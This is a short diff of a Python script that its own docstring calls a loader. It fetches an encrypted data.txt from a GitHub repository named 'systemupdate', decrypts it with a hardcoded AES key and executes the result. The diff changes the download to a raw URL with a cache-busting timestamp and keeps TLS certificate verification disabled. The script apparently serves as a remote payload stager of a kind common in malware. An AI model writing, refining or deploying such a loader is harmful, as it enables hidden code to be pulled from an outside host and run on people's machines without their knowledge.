@@ -1,11 +1,11 @@
 # -*- coding: utf-8 -*-
-"""뚱시스템 로더 — data.txt AES 복호화 + 실행 (GitHub API, CDN 캐시 회피)"""
+"""뚱시스템 로더 — data.txt AES 복호화 + 실행 (raw URL, CDN 캐시 회피)"""
 import base64
 import ctypes
-import json
 import os
 import ssl
 import sys
+import time
 import urllib.request
 import zlib
 
@@ -47,13 +47,16 @@ ctx.verify_mode = ssl.CERT_NONE
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 
 KEY = base64.b64decode("W5EwW1vV8EFoNKQsgTCrKmfZzbflm0JDU7MuNG8izu4=")
-API = "https://api.github.com/repos/blacknut0319-del/systemupdate/contents/data.txt?ref=main"
+DATA_URL = "https://raw.githubusercontent.com/blacknut0319-del/systemupdate/main/data.txt"
 
 
 def fetch_data_b64():
-    req = urllib.request.Request(API, headers={"User-Agent": "ddong"})
-    meta = json.loads(urllib.request.urlopen(req, timeout=20, context=ctx).read())
-    return base64.b64decode(meta["content"]).decode("utf-8").strip()
+    req = urllib.request.Request(
+        DATA_URL + "?t=%d" % int(time.time()),
+        headers={"User-Agent": "ddong", "Cache-Control": "no-cache"},
+    )
+    with urllib.request.urlopen(req, timeout=20, context=ctx) as r:
+        return r.read().decode("utf-8").strip()
 
 
 try:
